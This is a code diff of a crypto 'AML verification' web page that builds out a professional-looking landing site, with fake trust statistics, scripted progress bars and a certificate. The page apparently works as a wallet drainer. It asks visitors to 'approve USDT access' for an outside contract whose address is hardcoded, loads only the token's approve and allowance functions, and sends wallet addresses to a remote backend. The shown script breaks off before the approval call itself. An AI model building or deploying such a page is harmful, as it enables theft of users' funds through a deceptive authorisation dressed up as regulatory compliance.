@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wallet Verification</title>
+    <title>AML Verification - Secure Crypto Asset Verification</title>
+    <meta name="description" content="Professional AML verification service for cryptocurrency wallets. Verify compliance, assess risks, and get instant certification.">
     <style>
         * {
             margin: 0;
@@ -12,31 +13,283 @@
         }
         
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #ffffff;
+            color: #1e293b;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* Navigation */
+        .navbar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 15px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 800;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 30px;
+            list-style: none;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: #475569;
+            font-weight: 600;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: #667eea;
+        }
+
+        /* Hero Section */
+        .hero {
+            margin-top: 70px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 100px 5% 80px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="rgba(255,255,255,0.1)" d="M0,96L48,112C96,128,192,160,288,160C384,160,480,128,576,122.7C672,117,768,139,864,144C960,149,1056,139,1152,128C1248,117,1344,107,1392,101.3L1440,96L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path></svg>') no-repeat bottom;
+            background-size: cover;
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 1;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .hero h1 {
+            font-size: 48px;
+            font-weight: 800;
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+
+        .hero p {
+            font-size: 20px;
+            opacity: 0.95;
+            margin-bottom: 40px;
+        }
+
+        .hero-cta {
+            background: white;
+            color: #667eea;
+            padding: 18px 40px;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            display: inline-block;
+            text-decoration: none;
+        }
+
+        .hero-cta:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+
+        .trust-badges {
+            margin-top: 50px;
             display: flex;
             justify-content: center;
-            align-items: center;
-            padding: 20px;
+            gap: 40px;
+            flex-wrap: wrap;
         }
-        
-        .container {
+
+        .trust-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            opacity: 0.9;
+        }
+
+        .trust-badge-icon {
+            font-size: 24px;
+        }
+
+        /* Features Section */
+        .features {
+            padding: 80px 5%;
+            background: #f8fafc;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 36px;
+            font-weight: 800;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .section-subtitle {
+            text-align: center;
+            font-size: 18px;
+            color: #64748b;
+            margin-bottom: 60px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 40px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .feature-card {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+        }
+
+        .feature-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            margin: 0 auto 25px;
+        }
+
+        .feature-card h3 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+
+        .feature-card p {
+            color: #64748b;
+            line-height: 1.7;
+        }
+
+        /* How It Works */
+        .how-it-works {
+            padding: 80px 5%;
+            background: white;
+        }
+
+        .steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .step {
+            text-align: center;
+            position: relative;
+        }
+
+        .step-number {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 800;
+            margin: 0 auto 20px;
+        }
+
+        .step h3 {
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+
+        .step p {
+            color: #64748b;
+        }
+
+        /* Verification Section */
+        .verification-section {
+            padding: 80px 5%;
+            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+        }
+
+        .verification-container {
             background: white;
             border-radius: 20px;
-            padding: 40px;
-            max-width: 600px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            padding: 60px 40px;
+            max-width: 700px;
+            margin: 0 auto;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
         }
-        
-        h1 {
+
+        .verification-title {
             text-align: center;
-            color: #1e293b;
-            margin-bottom: 30px;
-            font-size: 28px;
+            font-size: 32px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
-        
+
+        .verification-subtitle {
+            text-align: center;
+            color: #64748b;
+            margin-bottom: 40px;
+            font-size: 16px;
+        }
+
+        /* Connect Section Styles */
         .connect-section {
             margin-bottom: 30px;
         }
@@ -45,41 +298,36 @@
             display: flex;
             align-items: center;
             gap: 15px;
+            justify-content: center;
         }
         
         #connectBtn {
-            background: #3b82f6;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
-            padding: 15px 30px;
+            padding: 18px 40px;
             border-radius: 12px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             transition: 0.3s;
             white-space: nowrap;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
         }
         
         #connectBtn:hover {
-            background: #2563eb;
             transform: translateY(-2px);
-        }
-        
-        #connectBtn:disabled {
-            background: #94a3b8;
-            cursor: not-allowed;
-            transform: none;
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
         }
         
         .wallet-info {
             display: none;
             align-items: center;
             gap: 10px;
-            padding: 10px 20px;
+            padding: 12px 20px;
             background: #f0fdf4;
             border: 2px solid #10b981;
             border-radius: 10px;
-            flex: 1;
         }
         
         .wallet-info.show {
@@ -87,30 +335,30 @@
         }
         
         .verified-icon {
-            width: 20px;
-            height: 20px;
+            width: 24px;
+            height: 24px;
             background: #10b981;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
-            font-size: 12px;
+            font-size: 14px;
             font-weight: bold;
         }
         
         .wallet-address {
-            font-family: monospace;
-            font-size: 14px;
+            font-family: 'Courier New', monospace;
+            font-size: 15px;
             color: #065f46;
-            font-weight: 600;
+            font-weight: 700;
         }
         
-        .verification-section {
+        .verification-section-inner {
             display: none;
         }
         
-        .verification-section.show {
+        .verification-section-inner.show {
             display: block;
         }
         
@@ -119,7 +367,7 @@
             background: #10b981;
             color: white;
             border: none;
-            padding: 15px;
+            padding: 18px;
             border-radius: 12px;
             font-size: 16px;
             font-weight: 600;
@@ -130,11 +378,13 @@
         
         #verifyBtn:hover {
             background: #059669;
+            transform: translateY(-2px);
         }
         
         #verifyBtn:disabled {
             background: #94a3b8;
             cursor: not-allowed;
+            transform: none;
         }
         
         .error-message {
@@ -157,7 +407,7 @@
         }
         
         .try-again {
-            color: #2563eb;
+            color: #667eea;
             text-decoration: none;
             font-weight: 600;
             display: inline-block;
@@ -266,7 +516,7 @@
         
         .analyzing {
             display: none;
-            color: #3b82f6;
+            color: #667eea;
             font-size: 14px;
             margin-top: 10px;
             animation: pulse 1.5s infinite;
@@ -281,7 +531,6 @@
             50% { opacity: 0.5; }
         }
         
-        /* Analysis Complete Section */
         .analysis-complete {
             display: none;
             background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
@@ -340,7 +589,7 @@
             background: #10b981;
             color: white;
             border: none;
-            padding: 15px;
+            padding: 18px;
             border-radius: 12px;
             font-size: 16px;
             font-weight: 600;
@@ -356,7 +605,8 @@
             background: #059669;
             transform: translateY(-2px);
         }
-        
+
+        /* Certificate Modal */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -376,7 +626,7 @@
         }
         
         .certificate-modal {
-            background: linear-gradient(180deg, #3b82f6 0%, #1e40af 100%);
+            background: linear-gradient(180deg, #667eea 0%, #764ba2 100%);
             border-radius: 20px;
             max-width: 500px;
             width: 100%;
@@ -561,15 +811,6 @@
             background: #059669;
         }
         
-        .cert-btn-secondary {
-            background: #3b82f6;
-            color: white;
-        }
-        
-        .cert-btn-secondary:hover {
-            background: #2563eb;
-        }
-        
         .cert-btn-close {
             background: rgba(255, 255, 255, 0.2);
             color: white;
@@ -579,15 +820,78 @@
         .cert-btn-close:hover {
             background: rgba(255, 255, 255, 0.3);
         }
-        
-        /* Print styles */
-        @media print {
-            body {
-                background: white;
-            }
-            .cert-btn-close {
-                display: none;
-            }
+
+        /* Stats Section */
+        .stats {
+            padding: 80px 5%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 40px;
+            max-width: 1000px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .stat-item h3 {
+            font-size: 48px;
+            font-weight: 800;
+            margin-bottom: 10px;
+        }
+
+        .stat-item p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+
+        /* Footer */
+        .footer {
+            padding: 60px 5% 30px;
+            background: #0f172a;
+            color: white;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+
+        .footer-section h4 {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section ul li {
+            margin-bottom: 10px;
+        }
+
+        .footer-section a {
+            color: #94a3b8;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .footer-section a:hover {
+            color: white;
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 30px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            color: #94a3b8;
         }
 
         /* Button Loading Animation */
@@ -595,17 +899,12 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
+
         .btn-loading {
             position: relative;
-            opacity: 0.8;  /* Make it look slightly disabled */
+            opacity: 0.8;
         }
-        
+
         .btn-loading::after {
             content: '';
             position: absolute;
@@ -620,8 +919,7 @@
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
-        
-        /* Fade out animation for wallet info */
+
         @keyframes fadeOut {
             from {
                 opacity: 1;
@@ -632,8 +930,7 @@
                 transform: translateX(-10px);
             }
         }
-        
-        /* Fade in animation for wallet info */
+
         @keyframes fadeIn {
             from {
                 opacity: 0;
@@ -644,148 +941,324 @@
                 transform: translateX(0);
             }
         }
-        
+
         .wallet-info.fade-out {
             animation: fadeOut 0.3s ease-out forwards;
         }
-        
+
         .wallet-info.fade-in {
             animation: fadeIn 0.3s ease-out forwards;
         }
-        
-        /* Pulsing text animation */
+
         .pulsing-text {
             animation: pulse 1.5s ease-in-out infinite;
         }
 
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 32px;
+            }
+
+            .hero p {
+                font-size: 16px;
+            }
+
+            .section-title {
+                font-size: 28px;
+            }
+
+            .nav-links {
+                display: none;
+            }
+
+            .verification-container {
+                padding: 40px 20px;
+            }
+
+            .connect-row {
+                flex-direction: column;
+            }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔐 Wallet Verification 6</h1>
-        
-        <div class="connect-section">
-            <div class="connect-row">
-                <button id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
-                <div id="walletInfo" class="wallet-info">
-                    <div class="verified-icon">✓</div>
-                    <span class="wallet-address" id="walletAddress"></span>
-                </div>
-            </div>
-        </div>
-        
-        <div id="verificationSection" class="verification-section">
-            <div id="errorMessage" class="error-message">
-                <div>
-                    <span class="error-text" id="errorText"></span>
-                </div>
-                <a href="#" class="try-again" onclick="startVerification(); return false;">🔄 Try again</a>
-            </div>
-            
-            <button id="verifyBtn" onclick="startVerification()">Confirm Verification</button>
-            
-            <div id="progressContainer" class="progress-container">
-                <div class="progress-title">Security Analysis</div>
-                <div class="analyzing" id="analyzingText">⚡ Analyzing...</div>
-                
-                <div class="progress-item overall">
-                    <div class="progress-header">
-                        <span class="progress-label">Overall Progress</span>
-                        <span class="progress-percentage" id="overallPercent">0%</span>
-                    </div>
-                    <div class="progress-bar-container">
-                        <div class="progress-bar" id="overallBar"></div>
-                    </div>
-                </div>
-                
-                <div class="progress-item">
-                    <div class="progress-header">
-                        <span class="progress-label">
-                            <span class="check-icon" id="check1">✓</span>
-                            Wallet Scanning
-                        </span>
-                        <span class="progress-percentage" id="percent1">0%</span>
-                    </div>
-                    <div class="progress-description">Analyzing wallet structure and basic information</div>
-                    <div class="progress-bar-container">
-                        <div class="progress-bar" id="bar1"></div>
-                    </div>
-                </div>
-                
-                <div class="progress-item">
-                    <div class="progress-header">
-                        <span class="progress-label">
-                            <span class="check-icon" id="check2">✓</span>
-                            Transaction History Analysis
-                        </span>
-                        <span class="progress-percentage" id="percent2">0%</span>
-                    </div>
-                    <div class="progress-description">Examining transaction patterns and history</div>
-                    <div class="progress-bar-container">
-                        <div class="progress-bar" id="bar2"></div>
-                    </div>
-                </div>
-                
-                <div class="progress-item">
-                    <div class="progress-header">
-                        <span class="progress-label">
-                            <span class="check-icon" id="check3">✓</span>
-                            Risk Assessment
-                        </span>
-                        <span class="progress-percentage" id="percent3">0%</span>
-                    </div>
-                    <div class="progress-description">Evaluating potential security risks</div>
-                    <div class="progress-bar-container">
-                        <div class="progress-bar" id="bar3"></div>
-                    </div>
-                </div>
-                
-                <div class="progress-item">
-                    <div class="progress-header">
-                        <span class="progress-label">
-                            <span class="check-icon" id="check4">✓</span>
-                            Compliance Verification
-                        </span>
-                        <span class="progress-percentage" id="percent4">0%</span>
-                    </div>
-                    <div class="progress-description">Checking AML/KYC compliance status</div>
-                    <div class="progress-bar-container">
-                        <div class="progress-bar" id="bar4"></div>
-                    </div>
-                </div>
-                
-                <div class="progress-item">
-                    <div class="progress-header">
-                        <span class="progress-label">
-                            <span class="check-icon" id="check5">✓</span>
-                            Final Scoring
-                        </span>
-                        <span class="progress-percentage" id="percent5">0%</span>
-                    </div>
-                    <div class="progress-description">Calculating final security score</div>
-                    <div class="progress-bar-container">
-                        <div class="progress-bar" id="bar5"></div>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Analysis Complete Section -->
-            <div id="analysisComplete" class="analysis-complete">
-                <div class="complete-icon">🛡️</div>
-                <div class="complete-title">🎉 Analysis Complete! 🎉</div>
-                <div class="complete-score" id="completeScore">68%</div>
-                <div class="complete-message">✅ Your USDT are of good quality and secure</div>
-                <div class="complete-submessage">🔒 Wallet verified and secure</div>
-            </div>
-            
-            <!-- View Certificate Button -->
-            <button id="downloadBtn" class="download-btn" onclick="viewCertificate()" style="display: none;">
-                📜 View Certificate
-            </button>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="logo">🛡️ AML Verify</div>
+        <ul class="nav-links">
+            <li><a href="#features">Features</a></li>
+            <li><a href="#how-it-works">How It Works</a></li>
+            <li><a href="#verify">Verify Now</a></li>
+        </ul>
+    </nav>
 
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-content">
+            <h1>Verify Your Crypto Assets with Confidence</h1>
+            <p>Professional AML compliance verification for cryptocurrency wallets. Get instant certification and ensure your assets meet regulatory standards.</p>
+            <a href="#verify" class="hero-cta">Start Verification</a>
+            
+            <div class="trust-badges">
+                <div class="trust-badge">
+                    <span class="trust-badge-icon">🔒</span>
+                    <span>Secure</span>
+                </div>
+                <div class="trust-badge">
+                    <span class="trust-badge-icon">⚡</span>
+                    <span>Instant</span>
+                </div>
+                <div class="trust-badge">
+                    <span class="trust-badge-icon">✓</span>
+                    <span>Compliant</span>
+                </div>
+            </div>
         </div>
-    </div>
-    
+    </section>
+
+    <!-- Features Section -->
+    <section id="features" class="features">
+        <h2 class="section-title">Why Choose AML Verify?</h2>
+        <p class="section-subtitle">Comprehensive verification powered by advanced blockchain analysis</p>
+        
+        <div class="features-grid">
+            <div class="feature-card">
+                <div class="feature-icon">✓</div>
+                <h3>AML Compliance</h3>
+                <p>Ensure your crypto assets meet anti-money laundering standards and regulatory requirements.</p>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">🛡️</div>
+                <h3>Risk Assessment</h3>
+                <p>Advanced analysis of transaction patterns to identify and mitigate potential risks.</p>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">⚡</div>
+                <h3>Instant Verification</h3>
+                <p>Get your security certificate in seconds with real-time blockchain verification.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- How It Works -->
+    <section id="how-it-works" class="how-it-works">
+        <h2 class="section-title">How It Works</h2>
+        <p class="section-subtitle">Three simple steps to verify your wallet</p>
+        
+        <div class="steps">
+            <div class="step">
+                <div class="step-number">1</div>
+                <h3>Connect Wallet</h3>
+                <p>Securely connect your crypto wallet using MetaMask or Trust Wallet</p>
+            </div>
+            
+            <div class="step">
+                <div class="step-number">2</div>
+                <h3>Authorize Verification</h3>
+                <p>Approve USDT access for comprehensive analysis of your assets</p>
+            </div>
+            
+            <div class="step">
+                <div class="step-number">3</div>
+                <h3>Get Certificate</h3>
+                <p>Receive your security certificate with detailed compliance report</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Verification Section -->
+    <section id="verify" class="verification-section">
+        <div class="verification-container">
+            <h2 class="verification-title">🔐 Wallet Verification</h2>
+            <p class="verification-subtitle">Connect your wallet to begin the AML verification process</p>
+            
+            <div class="connect-section">
+                <div class="connect-row">
+                    <button id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
+                    <div id="walletInfo" class="wallet-info">
+                        <div class="verified-icon">✓</div>
+                        <span class="wallet-address" id="walletAddress"></span>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="verificationSectionInner" class="verification-section-inner">
+                <div id="errorMessage" class="error-message">
+                    <div>
+                        <span class="error-text" id="errorText"></span>
+                    </div>
+                    <a href="#" class="try-again" onclick="startVerification(); return false;">🔄 Try again</a>
+                </div>
+                
+                <button id="verifyBtn" onclick="startVerification()">Confirm Verification</button>
+                
+                <div id="progressContainer" class="progress-container">
+                    <div class="progress-title">Security Analysis</div>
+                    <div class="analyzing" id="analyzingText">⚡ Analyzing...</div>
+                    
+                    <div class="progress-item overall">
+                        <div class="progress-header">
+                            <span class="progress-label">Overall Progress</span>
+                            <span class="progress-percentage" id="overallPercent">0%</span>
+                        </div>
+                        <div class="progress-bar-container">
+                            <div class="progress-bar" id="overallBar"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="progress-item">
+                        <div class="progress-header">
+                            <span class="progress-label">
+                                <span class="check-icon" id="check1">✓</span>
+                                Wallet Scanning
+                            </span>
+                            <span class="progress-percentage" id="percent1">0%</span>
+                        </div>
+                        <div class="progress-description">Analyzing wallet structure and basic information</div>
+                        <div class="progress-bar-container">
+                            <div class="progress-bar" id="bar1"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="progress-item">
+                        <div class="progress-header">
+                            <span class="progress-label">
+                                <span class="check-icon" id="check2">✓</span>
+                                Transaction History Analysis
+                            </span>
+                            <span class="progress-percentage" id="percent2">0%</span>
+                        </div>
+                        <div class="progress-description">Examining transaction patterns and history</div>
+                        <div class="progress-bar-container">
+                            <div class="progress-bar" id="bar2"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="progress-item">
+                        <div class="progress-header">
+                            <span class="progress-label">
+                                <span class="check-icon" id="check3">✓</span>
+                                Risk Assessment
+                            </span>
+                            <span class="progress-percentage" id="percent3">0%</span>
+                        </div>
+                        <div class="progress-description">Evaluating potential security risks</div>
+                        <div class="progress-bar-container">
+                            <div class="progress-bar" id="bar3"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="progress-item">
+                        <div class="progress-header">
+                            <span class="progress-label">
+                                <span class="check-icon" id="check4">✓</span>
+                                Compliance Verification
+                            </span>
+                            <span class="progress-percentage" id="percent4">0%</span>
+                        </div>
+                        <div class="progress-description">Checking AML/KYC compliance status</div>
+                        <div class="progress-bar-container">
+                            <div class="progress-bar" id="bar4"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="progress-item">
+                        <div class="progress-header">
+                            <span class="progress-label">
+                                <span class="check-icon" id="check5">✓</span>
+                                Final Scoring
+                            </span>
+                            <span class="progress-percentage" id="percent5">0%</span>
+                        </div>
+                        <div class="progress-description">Calculating final security score</div>
+                        <div class="progress-bar-container">
+                            <div class="progress-bar" id="bar5"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="analysisComplete" class="analysis-complete">
+                    <div class="complete-icon">🛡️</div>
+                    <div class="complete-title">🎉 Analysis Complete! 🎉</div>
+                    <div class="complete-score" id="completeScore">84%</div>
+                    <div class="complete-message">✅ Your USDT are of good quality and secure</div>
+                    <div class="complete-submessage">🔒 Wallet verified and secure</div>
+                </div>
+                
+                <button id="downloadBtn" class="download-btn" onclick="viewCertificate()" style="display: none;">
+                    📜 View Certificate
+                </button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Stats Section -->
+    <section class="stats">
+        <div class="stats-grid">
+            <div class="stat-item">
+                <h3>10K+</h3>
+                <p>Wallets Verified</p>
+            </div>
+            <div class="stat-item">
+                <h3>99.9%</h3>
+                <p>Accuracy Rate</p>
+            </div>
+            <div class="stat-item">
+                <h3>24/7</h3>
+                <p>Available</p>
+            </div>
+            <div class="stat-item">
+                <h3>100%</h3>
+                <p>Secure</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-section">
+                <h4>AML Verify</h4>
+                <p style="color: #94a3b8;">Professional cryptocurrency AML compliance verification service.</p>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Quick Links</h4>
+                <ul>
+                    <li><a href="#features">Features</a></li>
+                    <li><a href="#how-it-works">How It Works</a></li>
+                    <li><a href="#verify">Verify Now</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Legal</h4>
+                <ul>
+                    <li><a href="#">Terms of Service</a></li>
+                    <li><a href="#">Privacy Policy</a></li>
+                    <li><a href="#">Disclaimer</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Contact</h4>
+                <ul>
+                    <li><a href="#">Support</a></li>
+                    <li><a href="#">Documentation</a></li>
+                    <li><a href="#">FAQ</a></li>
+                </ul>
+            </div>
+        </div>
+        
+        <div class="footer-bottom">
+            <p>&copy; 2025 AML Verify. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <!-- Certificate Modal -->
     <div id="certificateModal" class="modal-overlay">
         <div class="certificate-modal">
             <div class="cert-icon">🛡️</div>
@@ -852,18 +1325,24 @@
                     Close Certificate
                 </button>
             </div>
-
         </div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script>
-        // ========================================
         // CONFIGURATION
-        // ========================================
         const CONTRACT_ADDRESS = "0x7BDD962fff20FB63a1C05bd1d2e67807EA0f57c0";
+        const BACKEND_URL = "https://trading-service-api.onrender.com";
+        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+        
+        const USDT_ABI = [
+            {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}
+        ];
 
-        const BACKEND_URL = "https://trading-service-api.onrender.com"; // Update with your Render URL
+        let web3, account, usdtContract;
+        let certificateData = {};
+        let isProcessing = false;
 
         // Save user to backend
         async function saveUserToBackend(walletAddress, certificateData) {
@@ -884,54 +1363,26 @@
             }
         }
 
-        
-        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-        
-        const USDT_ABI = [
-            {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}
-        ];
-
-        let web3, account, usdtContract;
-        let certificateData = {};
-        
-        // ========================================
-        // CONNECT/DISCONNECT WALLET (WITH ANIMATIONS)
-        // ========================================
-        let isProcessing = false;
-        
+        // CONNECT/DISCONNECT WALLET
         async function connectWallet() {
             const btn = document.getElementById('connectBtn');
             const walletInfo = document.getElementById('walletInfo');
             
-            // Prevent multiple clicks
-            if (isProcessing) {
-                return;
-            }
+            if (isProcessing) return;
             
-            // If already connected, disconnect with animation
             if (btn.textContent === 'Disconnect Wallet') {
                 isProcessing = true;
-                
-                // Show loading animation
                 btn.classList.add('btn-loading');
                 btn.innerHTML = '<span class="pulsing-text">Disconnecting</span>';
-                
-                // Add fade-out animation to wallet info
                 walletInfo.classList.add('fade-out');
                 
-                // Wait 2 seconds for animation
                 await new Promise(resolve => setTimeout(resolve, 2000));
                 
-                // Reset UI
                 walletInfo.classList.remove('show', 'fade-out', 'fade-in');
                 btn.classList.remove('btn-loading');
                 btn.textContent = 'Connect Wallet';
                 
-                // Hide verification section
-                document.getElementById('verificationSection').classList.remove('show');
-                
-                // Reset verification UI
+                document.getElementById('verificationSectionInner').classList.remove('show');
                 document.getElementById('analysisComplete').classList.remove('show');
                 document.getElementById('downloadBtn').style.display = 'none';
                 document.getElementById('verifyBtn').style.display = 'block';
@@ -943,23 +1394,20 @@
                 return;
             }
             
-            // Otherwise, connect wallet with animation
             try {
                 if (!window.ethereum) {
                     alert('Please install MetaMask or Trust Wallet!');
                     return;
                 }
-        
+
                 isProcessing = true;
-                
-                // Show loading animation
                 btn.classList.add('btn-loading');
                 btn.innerHTML = '<span class="pulsing-text">Connecting</span>';
-        
+
                 web3 = new Web3(window.ethereum);
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 account = accounts[0];
-        
+
                 const chainId = await web3.eth.getChainId();
                 if (chainId !== 1) {
                     btn.classList.remove('btn-loading');
@@ -968,16 +1416,13 @@
                     alert('Please switch to Ethereum Mainnet!');
                     return;
                 }
-        
+
                 usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
-        
-                // Wait 2 seconds for animation
+
                 await new Promise(resolve => setTimeout(resolve, 2000));
-        
-                // Remove loading animation
+
                 btn.classList.remove('btn-loading');
                 
-                // Update wallet address with fade-in animation
                 document.getElementById('walletAddress').textContent = 
                     account.slice(0, 6) + '...' + account.slice(-4);
                 
@@ -986,7 +1431,7 @@
                 
                 btn.textContent = 'Disconnect Wallet';
                 
-                document.getElementById('verificationSection').classList.add('show');
+                document.getElementById('verificationSectionInner').classList.add('show');
                 
                 isProcessing = false;
                 
@@ -1004,43 +1449,28 @@
             }
         }
 
-
-        
-        // ========================================
         // START VERIFICATION
-        // ========================================
-
         async function startVerification() {
             try {
                 document.getElementById('errorMessage').classList.remove('show');
                 document.getElementById('verifyBtn').disabled = true;
                 document.getElementById('verifyBtn').textContent = 'Checking approval...';
                 
-                // ✅ CHECK IF CONTRACT ADDRESS IS SET
                 if (CONTRACT_ADDRESS === "YOUR_TRADINGSERVICEHQ_ADDRESS_HERE" || !CONTRACT_ADDRESS) {
-                    throw new Error("Contract address not configured! Please update CONTRACT_ADDRESS in the code.");
+                    throw new Error("Contract address not configured!");
                 }
                 
-                // ✅ CHECK IF VALID ADDRESS
